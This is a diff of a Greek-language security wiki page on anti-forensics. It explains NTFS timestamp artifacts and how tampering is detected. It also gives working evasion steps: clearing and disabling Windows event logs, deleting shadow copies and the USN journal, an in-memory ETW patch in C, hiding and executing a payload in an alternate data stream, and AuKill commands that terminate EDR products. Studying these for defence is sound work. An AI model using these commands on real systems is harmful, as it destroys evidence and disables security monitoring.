@@ -1,164 +1,164 @@
-# Αντι-Δικαστικές Τεχνικές
+# Anti-Forensic Techniques
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Χρονικά Σημάδια
+## Timestamps
 
-Ένας επιτιθέμενος μπορεί να ενδιαφέρεται για **την αλλαγή των χρονικών σημείων αρχείων** για να αποφύγει την ανίχνευση.\
-Είναι δυνατόν να βρείτε τα χρονικά σημεία μέσα στο MFT σε χαρακτηριστικά `$STANDARD_INFORMATION` \_\_ και \_\_ `$FILE_NAME`.
+Ένας attacker μπορεί να ενδιαφέρεται να **αλλάξει τα timestamps των αρχείων** ώστε να αποφύγει τον εντοπισμό.\
+Είναι δυνατός ο εντοπισμός των timestamps μέσα στο MFT, στα attributes `$STANDARD_INFORMATION` \_\_ και \_\_ `$FILE_NAME`.
 
-Και τα δύο χαρακτηριστικά έχουν 4 χρονικά σημεία: **Τροποποίηση**, **πρόσβαση**, **δημιουργία** και **τροποποίηση μητρώου MFT** (MACE ή MACB).
+Και τα δύο attributes έχουν 4 timestamps: **Modification**, **access**, **creation** και **MFT registry modification** (MACE ή MACB).
 
-**Ο εξερευνητής των Windows** και άλλα εργαλεία δείχνουν τις πληροφορίες από **`$STANDARD_INFORMATION`**.
+Τα **Windows explorer** και άλλα εργαλεία εμφανίζουν τις πληροφορίες από το **`$STANDARD_INFORMATION`**.
 
-### TimeStomp - Αντι-δικαστικό Εργαλείο
+### TimeStomp - Anti-forensic Tool
 
-Αυτό το εργαλείο **τροποποιεί** τις πληροφορίες χρονικών σημείων μέσα στο **`$STANDARD_INFORMATION`** **αλλά** **όχι** τις πληροφορίες μέσα στο **`$FILE_NAME`**. Επομένως, είναι δυνατόν να **εντοπιστεί** **ύποπτη** **δραστηριότητα**.
+Αυτό το tool **τροποποιεί** τις πληροφορίες timestamp μέσα στο **`$STANDARD_INFORMATION`**, αλλά **όχι** τις πληροφορίες μέσα στο **`$FILE_NAME`**. Επομένως, είναι δυνατός ο **εντοπισμός** **ύποπτης** **δραστηριότητας**.
 
 ### Usnjrnl
 
-Το **USN Journal** (Ημερολόγιο Αριθμού Ακολουθίας Ενημέρωσης) είναι μια δυνατότητα του NTFS (σύστημα αρχείων Windows NT) που παρακολουθεί τις αλλαγές του όγκου. Το [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) εργαλείο επιτρέπει την εξέταση αυτών των αλλαγών.
+Το **USN Journal** (Update Sequence Number Journal) είναι μια δυνατότητα του NTFS (Windows NT file system) που καταγράφει τις αλλαγές του volume. Το tool [**UsnJrnl2Csv**](https://github.com/jschicht/UsnJrnl2Csv) επιτρέπει την εξέταση αυτών των αλλαγών.
 
-![](<../../images/image (801).png>)
+![TimeStomp - Anti-forensic Tool - Usnjrnl: Το USN Journal (Update Sequence Number Journal) είναι μια δυνατότητα του NTFS (Windows NT file system) που καταγράφει τις αλλαγές του volume. Το...](<../../images/image (801).png>)
 
-Η προηγούμενη εικόνα είναι η **έξοδος** που εμφανίζεται από το **εργαλείο** όπου μπορεί να παρατηρηθεί ότι κάποιες **αλλαγές πραγματοποιήθηκαν** στο αρχείο.
+Η προηγούμενη εικόνα είναι το **output** που εμφανίζει το **tool**, όπου μπορεί να παρατηρηθεί ότι **πραγματοποιήθηκαν κάποιες αλλαγές** στο αρχείο.
 
 ### $LogFile
 
-**Όλες οι αλλαγές μεταδεδομένων σε ένα σύστημα αρχείων καταγράφονται** σε μια διαδικασία γνωστή ως [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Τα καταγεγραμμένα μεταδεδομένα διατηρούνται σε ένα αρχείο με όνομα `**$LogFile**`, που βρίσκεται στον ριζικό κατάλογο ενός συστήματος αρχείων NTFS. Εργαλεία όπως το [LogFileParser](https://github.com/jschicht/LogFileParser) μπορούν να χρησιμοποιηθούν για την ανάλυση αυτού του αρχείου και την αναγνώριση αλλαγών.
+**Όλες οι αλλαγές metadata σε ένα file system καταγράφονται** σε μια διαδικασία γνωστή ως [write-ahead logging](https://en.wikipedia.org/wiki/Write-ahead_logging). Τα καταγεγραμμένα metadata αποθηκεύονται σε ένα αρχείο με όνομα `**$LogFile**`, το οποίο βρίσκεται στον root directory ενός NTFS file system. Tools όπως το [LogFileParser](https://github.com/jschicht/LogFileParser) μπορούν να χρησιμοποιηθούν για την ανάλυση αυτού του αρχείου και τον εντοπισμό αλλαγών.
 
-![](<../../images/image (137).png>)
+![Usnjrnl - $LogFile: Όλες οι αλλαγές metadata σε ένα file system καταγράφονται σε μια διαδικασία γνωστή ως write-ahead logging. Τα καταγεγραμμένα metadata αποθηκεύονται σε ένα αρχείο με όνομα $LogFile, το οποίο βρίσκεται στον root...](<../../images/image (137).png>)
 
-Και πάλι, στην έξοδο του εργαλείου είναι δυνατόν να δούμε ότι **κάποιες αλλαγές πραγματοποιήθηκαν**.
+Και πάλι, στο output του tool είναι δυνατό να φανεί ότι **πραγματοποιήθηκαν κάποιες αλλαγές**.
 
-Χρησιμοποιώντας το ίδιο εργαλείο είναι δυνατόν να εντοπιστεί **σε ποιο χρόνο τροποποιήθηκαν τα χρονικά σημεία**:
+Χρησιμοποιώντας το ίδιο tool, είναι δυνατό να εντοπιστεί **σε ποια χρονική στιγμή τροποποιήθηκαν τα timestamps**:
 
-![](<../../images/image (1089).png>)
+![Usnjrnl - $LogFile: Χρησιμοποιώντας το ίδιο tool, είναι δυνατό να εντοπιστεί σε ποια χρονική στιγμή τροποποιήθηκαν τα timestamps](<../../images/image (1089).png>)
 
-- CTIME: Χρόνος δημιουργίας αρχείου
-- ATIME: Χρόνος τροποποίησης αρχείου
-- MTIME: Τροποποίηση μητρώου MFT του αρχείου
-- RTIME: Χρόνος πρόσβασης αρχείου
+- CTIME: Χρόνος δημιουργίας του αρχείου
+- ATIME: Χρόνος τροποποίησης του αρχείου
+- MTIME: Τροποποίηση του MFT registry του αρχείου
+- RTIME: Χρόνος πρόσβασης στο αρχείο
 
-### Σύγκριση `$STANDARD_INFORMATION` και `$FILE_NAME`
+### `$STANDARD_INFORMATION` and `$FILE_NAME` comparison
 
-Ένας άλλος τρόπος για να εντοπιστούν ύποπτα τροποποιημένα αρχεία θα ήταν να συγκρίνουμε τον χρόνο και στα δύο χαρακτηριστικά αναζητώντας **ασυμφωνίες**.
+Ένας ακόμη τρόπος εντοπισμού ύποπτα τροποποιημένων αρχείων είναι η σύγκριση του χρόνου και στα δύο attributes, αναζητώντας **ασυμφωνίες**.
 
-### Νανοδευτερόλεπτα
+### Nanoseconds
 
-**Τα χρονικά σημεία NTFS έχουν μια **ακρίβεια** **100 νανοδευτερολέπτων**. Έτσι, η εύρεση αρχείων με χρονικά σημεία όπως 2010-10-10 10:10:**00.000:0000 είναι πολύ ύποπτη**.
+Τα timestamps του **NTFS** έχουν **ακρίβεια** **100 nanoseconds**. Επομένως, ο εντοπισμός αρχείων με timestamps όπως 2010-10-10 10:10:**00.000:0000 είναι πολύ ύποπτος**.
 
-### SetMace - Αντι-δικαστικό Εργαλείο
+### SetMace - Anti-forensic Tool
 
-Αυτό το εργαλείο μπορεί να τροποποιήσει και τα δύο χαρακτηριστικά `$STARNDAR_INFORMATION` και `$FILE_NAME`. Ωστόσο, από τα Windows Vista, είναι απαραίτητο να υπάρχει ένα ζωντανό λειτουργικό σύστημα για να τροποποιηθεί αυτή η πληροφορία.
+Αυτό το tool μπορεί να τροποποιήσει και τα δύο attributes, `$STARNDAR_INFORMATION` και `$FILE_NAME`. Ωστόσο, από τα Windows Vista, απαιτείται ένα live OS για την τροποποίηση αυτών των πληροφοριών.
 
-## Απόκρυψη Δεδομένων
+## Data Hiding
 
-Το NFTS χρησιμοποιεί ένα cluster και το ελάχιστο μέγεθος πληροφορίας. Αυτό σημαίνει ότι αν ένα αρχείο καταλαμβάνει και ένα cluster και μισό, το **υπόλοιπο μισό δεν θα χρησιμοποιηθεί ποτέ** μέχρι να διαγραφεί το αρχείο. Έτσι, είναι δυνατόν να **αποκρυφτούν δεδομένα σε αυτόν τον χώρο slack**.
+Το NFTS χρησιμοποιεί clusters και το ελάχιστο μέγεθος πληροφορίας. Αυτό σημαίνει ότι αν ένα αρχείο καταλαμβάνει ενάμιση cluster, **το υπόλοιπο μισό δεν πρόκειται να χρησιμοποιηθεί** μέχρι να διαγραφεί το αρχείο. Επομένως, είναι δυνατό να **κρυφτούν δεδομένα σε αυτόν τον slack space**.
 
-Υπάρχουν εργαλεία όπως το slacker που επιτρέπουν την απόκρυψη δεδομένων σε αυτόν τον "κρυφό" χώρο. Ωστόσο, μια ανάλυση του `$logfile` και του `$usnjrnl` μπορεί να δείξει ότι προστέθηκαν κάποια δεδομένα:
+Υπάρχουν tools όπως το slacker, τα οποία επιτρέπουν την απόκρυψη δεδομένων σε αυτόν τον "κρυφό" χώρο. Ωστόσο, μια ανάλυση των `$logfile` και `$usnjrnl` μπορεί να δείξει ότι προστέθηκαν κάποια δεδομένα:
 
-![](<../../images/image (1060).png>)
+![SetMace - Anti-forensic Tool - Data Hiding: Υπάρχουν tools όπως το slacker, τα οποία επιτρέπουν την απόκρυψη δεδομένων σε αυτόν τον "κρυφό" χώρο. Ωστόσο, μια ανάλυση των $logfile και $usnjrnl μπορεί να δείξει ότι...](<../../images/image (1060).png>)
 
-Έτσι, είναι δυνατόν να ανακτηθεί ο χώρος slack χρησιμοποιώντας εργαλεία όπως το FTK Imager. Σημειώστε ότι αυτός ο τύπος εργαλείου μπορεί να αποθηκεύσει το περιεχόμενο κρυπτογραφημένο ή ακόμα και κρυπτογραφημένο.
+Στη συνέχεια, είναι δυνατό να ανακτηθεί ο slack space με tools όπως το FTK Imager. Σημειώστε ότι αυτού του είδους τα tools μπορούν να αποθηκεύσουν το περιεχόμενο σε obfuscated ή ακόμη και encrypted μορφή.
 
 ## UsbKill
 
-Αυτό είναι ένα εργαλείο που θα **απενεργοποιήσει τον υπολογιστή αν ανιχνευθεί οποιαδήποτε αλλαγή στις θύρες USB**.\
-Ένας τρόπος για να το ανακαλύψετε θα ήταν να ελέγξετε τις τρέχουσες διαδικασίες και **να αναθεωρήσετε κάθε εκτελέσιμο python script**.
+Αυτό είναι ένα tool που **απενεργοποιεί τον υπολογιστή αν εντοπιστεί οποιαδήποτε αλλαγή** στις USB ports.\
+Ένας τρόπος εντοπισμού του είναι η επιθεώρηση των running processes και η **εξέταση κάθε python script που εκτελείται**.
 
-## Ζωντανές Διανομές Linux
+## Live Linux Distributions
 
-Αυτές οι διανομές **εκτελούνται μέσα στη μνήμη RAM**. Ο μόνος τρόπος για να τις ανιχνεύσετε είναι **σε περίπτωση που το σύστημα αρχείων NTFS είναι προσαρτημένο με δικαιώματα εγγραφής**. Αν είναι προσαρτημένο μόνο με δικαιώματα ανάγνωσης, δεν θα είναι δυνατόν να ανιχνευθεί η εισβολή.
+Αυτές οι distros **εκτελούνται μέσα στη μνήμη RAM**. Ο μόνος τρόπος εντοπισμού τους είναι **σε περίπτωση που το NTFS file-system έχει γίνει mount με write permissions**. Αν έχει γίνει mount μόνο με read permissions, δεν θα είναι δυνατός ο εντοπισμός του intrusion.
 
-## Ασφαλής Διαγραφή
+## Secure Deletion
 
 [https://github.com/Claudio-C/awesome-data-sanitization](https://github.com/Claudio-C/awesome-data-sanitization)
 
-## Ρύθμιση των Windows
+## Windows Configuration
 
-Είναι δυνατόν να απενεργοποιηθούν πολλές μέθοδοι καταγραφής των Windows για να καταστεί η δικαστική έρευνα πολύ πιο δύσκολη.
+Είναι δυνατό να απενεργοποιηθούν διάφορες μέθοδοι logging των Windows, ώστε να γίνει πολύ δυσκολότερη η forensic investigation.
 
-### Απενεργοποίηση Χρονικών Σημείων - UserAssist
+### Disable Timestamps - UserAssist
 
-Αυτό είναι ένα κλειδί μητρώου που διατηρεί ημερομηνίες και ώρες όταν κάθε εκτελέσιμο εκτελείται από τον χρήστη.
+Αυτό είναι ένα registry key που διατηρεί τις ημερομηνίες και τις ώρες κατά τις οποίες εκτελέστηκε κάθε executable από τον user.
 
 Η απενεργοποίηση του UserAssist απαιτεί δύο βήματα:
 
-1. Ρυθμίστε δύο κλειδιά μητρώου, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` και `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, και τα δύο στο μηδέν για να δηλώσετε ότι θέλουμε να απενεργοποιηθεί το UserAssist.
-2. Καθαρίστε τους υποκαταλόγους του μητρώου σας που μοιάζουν με `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.
+1. Ορίστε δύο registry keys, `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackProgs` και `HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\Advanced\Start_TrackEnabled`, και τα δύο σε μηδέν, ώστε να δηλωθεί ότι θέλουμε το UserAssist απενεργοποιημένο.
+2. Διαγράψτε τα registry subtrees που έχουν μορφή `HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\<hash>`.
 
-### Απενεργοποίηση Χρονικών Σημείων - Prefetch
+### Disable Timestamps - Prefetch
 
-Αυτό θα αποθηκεύσει πληροφορίες σχετικά με τις εφαρμογές που εκτελούνται με στόχο τη βελτίωση της απόδοσης του συστήματος Windows. Ωστόσο, αυτό μπορεί επίσης να είναι χρήσιμο για δικαστικές πρακτικές.
+Αυτό αποθηκεύει πληροφορίες σχετικά με τις εφαρμογές που εκτελέστηκαν, με στόχο τη βελτίωση της απόδοσης του Windows system. Ωστόσο, μπορεί επίσης να είναι χρήσιμο για forensic practices.
 
-- Εκτελέστε `regedit`
-- Επιλέξτε τη διαδρομή αρχείου `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
-- Κάντε δεξί κλικ και στα δύο `EnablePrefetcher` και `EnableSuperfetch`
-- Επιλέξτε Τροποποίηση σε καθένα από αυτά για να αλλάξετε την τιμή από 1 (ή 3) σε 0
-- Επανεκκινήστε
+- Εκτελέστε το `regedit`
+- Επιλέξτε το file path `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SessionManager\Memory Management\PrefetchParameters`
+- Κάντε δεξί κλικ στα `EnablePrefetcher` και `EnableSuperfetch`
+- Επιλέξτε Modify σε καθένα από αυτά, για να αλλάξετε την τιμή από 1 (ή 3) σε 0
+- Κάντε restart
 
-### Απενεργοποίηση Χρονικών Σημείων - Χρόνος Τελευταίας Πρόσβασης
+### Disable Timestamps - Last Access Time
 
-Όποτε ένα φάκελος ανοίγεται από έναν όγκο NTFS σε έναν διακομιστή Windows NT, το σύστημα παίρνει τον χρόνο για να **ενημερώσει ένα πεδίο χρονικού σημείου σε κάθε καταχωρημένο φάκελο**, που ονομάζεται χρόνος τελευταίας πρόσβασης. Σε έναν πολύ χρησιμοποιούμενο όγκο NTFS, αυτό μπορεί να επηρεάσει την απόδοση.
+Κάθε φορά που ανοίγει ένας folder από ένα NTFS volume σε Windows NT server, το system καταγράφει την ώρα για να **ενημερώσει ένα πεδίο timestamp σε κάθε folder της λίστας**, το οποίο ονομάζεται last access time. Σε ένα NTFS volume με έντονη χρήση, αυτό μπορεί να επηρεάσει την απόδοση.
 
-1. Ανοίξτε τον Επεξεργαστή Μητρώου (Regedit.exe).
-2. Περιηγηθείτε στο `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
-3. Αναζητήστε το `NtfsDisableLastAccessUpdate`. Αν δεν υπάρχει, προσθέστε αυτό το DWORD και ρυθμίστε την τιμή του σε 1, που θα απενεργοποιήσει τη διαδικασία.
-4. Κλείστε τον Επεξεργαστή Μητρώου και επανεκκινήστε τον διακομιστή.
+1. Ανοίξτε τον Registry Editor (Regedit.exe).
+2. Μεταβείτε στο `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem`.
+3. Αναζητήστε το `NtfsDisableLastAccessUpdate`. Αν δεν υπάρχει, προσθέστε αυτό το DWORD και ορίστε την τιμή του σε 1, ώστε να απενεργοποιηθεί η διαδικασία.
+4. Κλείστε τον Registry Editor και κάντε reboot στον server.
 
-### Διαγραφή Ιστορικού USB
+### Delete USB History
 
-Όλες οι **Εγγραφές Συσκευών USB** αποθηκεύονται στο Μητρώο των Windows κάτω από το κλειδί μητρώου **USBSTOR** που περιέχει υποκλειδιά που δημιουργούνται όποτε συνδέετε μια συσκευή USB στον υπολογιστή ή το φορητό σας. Μπορείτε να βρείτε αυτό το κλειδί εδώ H`KEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Διαγράφοντας αυτό** θα διαγράψετε το ιστορικό USB.\
-Μπορείτε επίσης να χρησιμοποιήσετε το εργαλείο [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html) για να βεβαιωθείτε ότι τα έχετε διαγράψει (και για να τα διαγράψετε).
+Όλα τα **USB Device Entries** αποθηκεύονται στο Windows Registry, κάτω από το registry key **USBSTOR**, το οποίο περιέχει subkeys που δημιουργούνται κάθε φορά που συνδέετε ένα USB Device στον υπολογιστή ή το Laptop σας. Μπορείτε να βρείτε αυτό το key εδώ: `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Enum\USBSTOR`. **Διαγράφοντάς το**, θα διαγράψετε το USB history.\
+Μπορείτε επίσης να χρησιμοποιήσετε το tool [**USBDeview**](https://www.nirsoft.net/utils/usb_devices_view.html), για να βεβαιωθείτε ότι τα έχετε διαγράψει (και για να τα διαγράψετε).
 
-Ένα άλλο αρχείο που αποθηκεύει πληροφορίες σχετικά με τα USB είναι το αρχείο `setupapi.dev.log` μέσα στο `C:\Windows\INF`. Αυτό θα πρέπει επίσης να διαγραφεί.
+Ένα ακόμη αρχείο που αποθηκεύει πληροφορίες για τα USBs είναι το `setupapi.dev.log`, μέσα στο `C:\Windows\INF`. Θα πρέπει επίσης να διαγραφεί.
 
-### Απενεργοποίηση Σκιάς Αντιγράφων
+### Disable Shadow Copies
 
-**Λίστα** σκιάς αντιγράφων με `vssadmin list shadowstorage`\
+**Εμφανίστε** τα shadow copies με `vssadmin list shadowstorage`\
 **Διαγράψτε** τα εκτελώντας `vssadmin delete shadow`
 
-Μπορείτε επίσης να τα διαγράψετε μέσω GUI ακολουθώντας τα βήματα που προτείνονται στο [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
+Μπορείτε επίσης να τα διαγράψετε μέσω GUI, ακολουθώντας τα βήματα που προτείνονται στο [https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html](https://www.ubackup.com/windows-10/how-to-delete-shadow-copies-windows-10-5740.html)
 
-Για να απενεργοποιήσετε τις σκιές αντιγράφων [βήματα από εδώ](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
+Για να απενεργοποιήσετε τα shadow copies, ακολουθήστε [τα βήματα από εδώ](https://support.waters.com/KB_Inf/Other/WKB15560_How_to_disable_Volume_Shadow_Copy_Service_VSS_in_Windows):
 
-1. Ανοίξτε το πρόγραμμα Υπηρεσίες πληκτρολογώντας "services" στο πλαίσιο αναζήτησης κειμένου μετά την κλικ στο κουμπί εκκίνησης των Windows.
-2. Από τη λίστα, βρείτε "Volume Shadow Copy", επιλέξτε το και στη συνέχεια αποκτήστε πρόσβαση στις Ιδιότητες κάνοντας δεξί κλικ.
-3. Επιλέξτε Απενεργοποιημένο από το αναπτυσσόμενο μενού "Τύπος εκκίνησης" και στη συνέχεια επιβεβαιώστε την αλλαγή κάνοντας κλικ στο Εφαρμογή και OK.
+1. Ανοίξτε το Services program πληκτρολογώντας "services" στο text search box, αφού κάνετε click στο Windows start button.
+2. Από τη λίστα, βρείτε το "Volume Shadow Copy", επιλέξτε το και, στη συνέχεια, ανοίξτε το Properties κάνοντας δεξί κλικ.
+3. Επιλέξτε Disabled από το drop-down menu "Startup type" και, στη συνέχεια, επιβεβαιώστε την αλλαγή κάνοντας click στα Apply και OK.
 
-Είναι επίσης δυνατόν να τροποποιήσετε τη ρύθμιση των αρχείων που θα αντιγραφούν στη σκιά στο μητρώο `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
+Είναι επίσης δυνατό να τροποποιηθεί η διαμόρφωση των αρχείων που πρόκειται να αντιγραφούν στο shadow copy, μέσω του registry `HKLM\SYSTEM\CurrentControlSet\Control\BackupRestore\FilesNotToSnapshot`
 
-### Επικαλύψτε διαγραμμένα αρχεία
+### Overwrite deleted files
 
-- Μπορείτε να χρησιμοποιήσετε ένα **εργαλείο Windows**: `cipher /w:C` Αυτό θα υποδείξει στον cipher να αφαιρέσει οποιαδήποτε δεδομένα από τον διαθέσιμο μη χρησιμοποιούμενο χώρο δίσκου μέσα στον δίσκο C.
-- Μπορείτε επίσης να χρησιμοποιήσετε εργαλεία όπως το [**Eraser**](https://eraser.heidi.ie)
+- Μπορείτε να χρησιμοποιήσετε ένα **Windows tool**: `cipher /w:C`. Αυτό θα δώσει εντολή στο cipher να αφαιρέσει τυχόν δεδομένα από τον διαθέσιμο αχρησιμοποίητο χώρο στον δίσκο C.
+- Μπορείτε επίσης να χρησιμοποιήσετε tools όπως το [**Eraser**](https://eraser.heidi.ie)
 
-### Διαγραφή καταγραφών γεγονότων Windows
+### Delete Windows event logs
 
-- Windows + R --> eventvwr.msc --> Επεκτείνετε "Windows Logs" --> Κάντε δεξί κλικ σε κάθε κατηγορία και επιλέξτε "Clear Log"
+- Windows + R --> eventvwr.msc --> Αναπτύξτε το "Windows Logs" --> Κάντε δεξί κλικ σε κάθε category και επιλέξτε "Clear Log"
 - `for /F "tokens=*" %1 in ('wevtutil.exe el') DO wevtutil.exe cl "%1"`
 - `Get-EventLog -LogName * | ForEach { Clear-EventLog $_.Log }`
 
-### Απενεργοποίηση καταγραφών γεγονότων Windows
+### Disable Windows event logs
 
 - `reg add 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\eventlog' /v Start /t REG_DWORD /d 4 /f`
-- Μέσα στην ενότητα υπηρεσιών απενεργοποιήστε την υπηρεσία "Windows Event Log"
+- Στην ενότητα services, απενεργοποιήστε το service "Windows Event Log"
 - `WEvtUtil.exec clear-log` ή `WEvtUtil.exe cl`
 
-### Απενεργοποίηση $UsnJrnl
+### Disable $UsnJrnl
 
 - `fsutil usn deletejournal /d c:`
 
 ---
 
-## Προηγμένη Καταγραφή & Παραποίηση Ιχνών (2023-2025)
+## Advanced Logging & Trace Tampering (2023-2025)
 
-### Καταγραφή ScriptBlock/Module PowerShell
+### PowerShell ScriptBlock/Module Logging
 
-Οι πρόσφατες εκδόσεις των Windows 10/11 και Windows Server διατηρούν **πλούσια δικαστικά αποδεικτικά στοιχεία PowerShell** κάτω από
-`Microsoft-Windows-PowerShell/Operational` (γεγονότα 4104/4105/4106).
-Οι επιτιθέμενοι μπορούν να τα απενεργοποιήσουν ή να τα διαγράψουν εν κινήσει:
+Οι πρόσφατες εκδόσεις των Windows 10/11 και του Windows Server διατηρούν **πλούσια PowerShell forensic artifacts** στο
+`Microsoft-Windows-PowerShell/Operational` (events 4104/4105/4106).
+Οι attackers μπορούν να τα απενεργοποιήσουν ή να τα διαγράψουν on-the-fly:
 ```powershell
 # Turn OFF ScriptBlock & Module logging (registry persistence)
 New-ItemProperty -Path "HKLM:\\SOFTWARE\\Microsoft\\PowerShell\\3\\PowerShellEngine" \
@@ -170,13 +170,11 @@ New-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShel
 Get-WinEvent -LogName 'Microsoft-Windows-PowerShell/Operational' |
 Remove-WinEvent               # requires admin & Win11 23H2+
 ```
-Οι αμυντικοί θα πρέπει να παρακολουθούν τις αλλαγές σε αυτά τα κλειδιά μητρώου και την υψηλή αφαίρεση γεγονότων PowerShell.
+Οι defenders θα πρέπει να παρακολουθούν για αλλαγές σε αυτά τα registry keys και για μαζική αφαίρεση PowerShell events.
 
 ### ETW (Event Tracing for Windows) Patch
 
-Τα προϊόντα ασφάλειας τερματικών εξαρτώνται σε μεγάλο βαθμό από το ETW. Μια δημοφιλής μέθοδος αποφυγής το 2024 είναι να
-διορθώσετε το `ntdll!EtwEventWrite`/`EtwEventWriteFull` στη μνήμη έτσι ώστε κάθε κλήση ETW να επιστρέφει `STATUS_SUCCESS`
-χωρίς να εκπέμπει το γεγονός:
+Τα προϊόντα endpoint security βασίζονται σε μεγάλο βαθμό στο ETW. Μια δημοφιλής μέθοδος evasion το 2024 είναι το patch του `ntdll!EtwEventWrite`/`EtwEventWriteFull` στη μνήμη, ώστε κάθε κλήση ETW να επιστρέφει `STATUS_SUCCESS` χωρίς να εκπέμπει το event:
 ```c
 // 0xC3 = RET on x64
 unsigned char patch[1] = { 0xC3 };
@@ -184,44 +182,49 @@ WriteProcessMemory(GetCurrentProcess(),
 GetProcAddress(GetModuleHandleA("ntdll.dll"), "EtwEventWrite"),
 patch, sizeof(patch), NULL);
 ```
-Public PoCs (e.g. `EtwTiSwallow`) implement the same primitive in PowerShell or C++.
-Because the patch is **process-local**, EDRs running inside other processes may miss it.
-Detection: compare `ntdll` in memory vs. on disk, or hook before user-mode.
+Δημόσια PoCs (π.χ. `EtwTiSwallow`) υλοποιούν το ίδιο primitive σε PowerShell ή C++.
+Επειδή το patch είναι **τοπικό στη διεργασία**, τα EDRs που εκτελούνται μέσα σε άλλες διεργασίες ενδέχεται να μην το εντοπίσουν.
+Detection: σύγκρινε το `ntdll` στη μνήμη με αυτό στον δίσκο ή κάνε hook πριν από το user-mode.
 
-### Αναβίωση Εναλλακτικών Ρευμάτων Δεδομένων (ADS)
+### Επαναφορά των Alternate Data Streams (ADS)
 
-Malware campaigns in 2023 (e.g. **FIN12** loaders) have been seen staging second-stage binaries
-inside ADS to stay out of sight of traditional scanners:
+Σε καμπάνιες malware το 2023 (π.χ. loaders του **FIN12**), έχει παρατηρηθεί η τοποθέτηση binaries δεύτερου σταδίου
+μέσα σε ADS, ώστε να παραμένουν εκτός οπτικού πεδίου των παραδοσιακών scanners:
 ```cmd
 rem Hide cobalt.bin inside an ADS of a PDF
 type cobalt.bin > report.pdf:win32res.dll
 rem Execute directly
 wmic process call create "cmd /c report.pdf:win32res.dll"
 ```
-Αναγνωρίστε ροές με `dir /R`, `Get-Item -Stream *`, ή Sysinternals `streams64.exe`. Η αντιγραφή του αρχείου host σε FAT/exFAT ή μέσω SMB θα αφαιρέσει τη κρυφή ροή και μπορεί να χρησιμοποιηθεί από τους ερευνητές για να ανακτήσουν το payload.
+Απαριθμήστε τα streams με `dir /R`, `Get-Item -Stream *` ή το Sysinternals `streams64.exe`.
+Η αντιγραφή του αρχείου hosts σε FAT/exFAT ή μέσω SMB θα αφαιρέσει το κρυφό stream και μπορεί να χρησιμοποιηθεί
+από τους ερευνητές για την ανάκτηση του payload.
 
 ### BYOVD & “AuKill” (2023)
 
-Bring-Your-Own-Vulnerable-Driver χρησιμοποιείται πλέον τακτικά για **anti-forensics** σε επιθέσεις ransomware. Το εργαλείο ανοιχτού κώδικα **AuKill** φορτώνει έναν υπογεγραμμένο αλλά ευάλωτο οδηγό (`procexp152.sys`) για να αναστείλει ή να τερματίσει τους EDR και τους forensic αισθητήρες **πριν από την κρυπτογράφηση & την καταστροφή των καταγραφών**:
+Το Bring-Your-Own-Vulnerable-Driver χρησιμοποιείται πλέον συστηματικά για **anti-forensics** σε εισβολές ransomware.
+Το open-source εργαλείο **AuKill** φορτώνει έναν υπογεγραμμένο αλλά ευάλωτο driver (`procexp152.sys`) για
+την αναστολή ή τον τερματισμό των EDR και των forensic sensors **πριν από την κρυπτογράφηση και την καταστροφή των logs**:<sup>[[1]](#references)</sup>
 ```cmd
 AuKill.exe -e "C:\\Program Files\\Windows Defender\\MsMpEng.exe"
 AuKill.exe -k CrowdStrike
 ```
-Ο οδηγός αφαιρείται στη συνέχεια, αφήνοντας ελάχιστα αποδεικτικά στοιχεία.  
-Μειώσεις: ενεργοποιήστε τη λίστα αποκλεισμού ευάλωτων οδηγών της Microsoft (HVCI/SAC) και ειδοποιήστε για τη δημιουργία υπηρεσίας πυρήνα από διαδρομές που μπορούν να γραφούν από χρήστες.
+Ο driver αφαιρείται στη συνέχεια, αφήνοντας ελάχιστα artifacts.<sup>[[1]](#references)</sup>
+Mitigations: ενεργοποιήστε τη Microsoft vulnerable-driver blocklist (HVCI/SAC)
+και δημιουργήστε alert για δημιουργία kernel-service από διαδρομές εγγράψιμες από χρήστες.
 
 ---
 
-## Linux Anti-Forensics: Αυτο-επιδιόρθωση και Cloud C2 (2023–2025)
+## Linux Anti-Forensics: Self-Patching και Cloud C2 (2023–2025)
 
-### Αυτο‑επιδιόρθωση συμβιβασμένων υπηρεσιών για μείωση της ανίχνευσης (Linux)  
-Οι αντίπαλοι ολοένα και περισσότερο “αυτο‑επιδιορθώνουν” μια υπηρεσία αμέσως μετά την εκμετάλλευσή της για να αποτρέψουν την επανα-εκμετάλλευση και να καταστείλουν τις ανιχνεύσεις που βασίζονται σε ευπάθειες. Η ιδέα είναι να αντικαταστήσουν ευάλωτα στοιχεία με τις τελευταίες νόμιμες upstream εκδόσεις/JARs, έτσι ώστε οι σαρωτές να αναφέρουν τον υπολογιστή ως επιδιορθωμένο ενώ η επιμονή και το C2 παραμένουν.
+### Self‑patching παραβιασμένων services για μείωση του detection (Linux)
